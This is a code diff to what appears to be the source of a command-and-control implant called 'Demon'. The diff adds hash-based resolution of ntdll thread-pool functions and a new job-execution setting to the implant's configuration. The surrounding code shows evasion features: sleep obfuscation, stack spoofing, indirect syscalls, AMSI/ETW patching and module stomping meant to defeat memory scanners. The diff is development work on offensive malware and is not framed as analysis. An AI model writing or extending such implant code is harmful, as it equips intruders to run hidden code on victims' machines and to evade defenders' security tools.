@@ -334,6 +334,11 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
         Instance->Win32.RtlCopyMappedMemory               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );
 
+        /* ARC-09: NT thread pool functions */
+        Instance->Win32.TpAllocWork                       = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_TPALLOCWORK );
+        Instance->Win32.TpPostWork                        = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_TPPOSTWORK );
+        Instance->Win32.TpReleaseWork                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_TPRELEASEWORK );
+
         /* Native functions */
         Instance->Win32.NtClose                           = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCLOSE );
         Instance->Win32.NtCreateEvent                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCREATEEVENT );
@@ -682,6 +687,11 @@ VOID DemonConfig()
      * after initialization to defeat memory scanners. */
     Instance->Config.Implant.ModuleStomp = TRUE;
 
+    /* ARC-09: job execution mode — default to per-thread for compatibility.
+     * When the teamserver gains JobExecution profile-key support it will be
+     * appended to the config blob and parsed here instead of hardcoded. */
+    Instance->Config.Implant.JobExecution = JOB_EXEC_THREAD;
+
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
         " - Technique: %d \n"
@@ -690,14 +700,16 @@ VOID DemonConfig()
         "[CONFIG] SysIndirect : %s\n"
         "[CONFIG] AmsiEtwPatch: %d\n"
         "[CONFIG] HeapEnc     : %s\n"
-        "[CONFIG] ModuleStomp : %s\n",
+        "[CONFIG] ModuleStomp : %s\n"
+        "[CONFIG] JobExecution: %s\n",
         Instance->Config.Implant.SleepMaskTechnique,
         Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
         Instance->Config.Implant.ProxyLoading,
         Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
         Instance->Config.Implant.AmsiEtwPatch,
         Instance->Config.Implant.HeapEnc ? "TRUE" : "FALSE",
-        Instance->Config.Implant.ModuleStomp ? "TRUE" : "FALSE"
+        Instance->Config.Implant.ModuleStomp ? "TRUE" : "FALSE",
+        Instance->Config.Implant.JobExecution == JOB_EXEC_THREADPOOL ? "threadpool" : "thread"
     )
 
 #ifdef TRANSPORT_HTTP
